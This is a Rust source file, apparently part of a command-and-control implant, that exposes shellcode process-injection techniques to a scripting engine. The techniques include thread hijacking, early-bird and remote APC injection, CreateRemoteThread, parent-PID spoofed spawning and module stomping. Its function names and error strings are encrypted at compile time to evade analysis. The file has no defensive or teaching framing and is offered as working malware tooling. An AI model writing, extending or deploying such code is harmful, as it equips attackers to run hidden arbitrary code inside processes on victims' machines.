// src/agent/scripting/injection.rs
use rhai::Engine;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {
    engine.register_fn(&aes_str!("native_inject_remote_hijack"), |pid_str: &str, b64_code: &str| -> String {
        let pid = pid_str.parse::<u32>().unwrap_or(0);
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_remote_hijack(pid, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Hijack Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_spawn_early_bird"), |binary: &str, b64_code: &str| -> String {
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_spawn_early_bird(binary, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Spawn Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_remote_apc"), |pid_str: &str, b64_code: &str| -> String {
        let pid = pid_str.parse::<u32>().unwrap_or(0);
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_remote_apc(pid, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("APC Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_remote_create_thread"), |pid_str: &str, b64_code: &str| -> String {
        let pid = pid_str.parse::<u32>().unwrap_or(0);
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_remote_create_thread(pid, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Classic Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_self"), |b64_code: &str| -> String {
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_self(&shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Self Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_spawn_advanced"), |binary: &str, ppid_str: &str, b64_code: &str| -> String {
        let ppid = ppid_str.parse::<u32>().unwrap_or(0);
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_spawn_advanced(binary, ppid, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Adv Spawn Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_module_stomping"), |pid_str: &str, dll_name: &str, b64_code: &str| -> String {
        let pid = pid_str.parse::<u32>().unwrap_or(0);
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_module_stomping(pid, dll_name, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Stomp Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("native_inject_module_stomping_auto"), |pid_str: &str, b64_code: &str| -> String {
        let pid = pid_str.parse::<u32>().unwrap_or(0);
        let shellcode = BASE64.decode(b64_code).unwrap_or_default();
        match crate::agent::injection::inject_module_stomping_auto(pid, &shellcode) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Auto Stomp Error: "), e),
        }
    });
}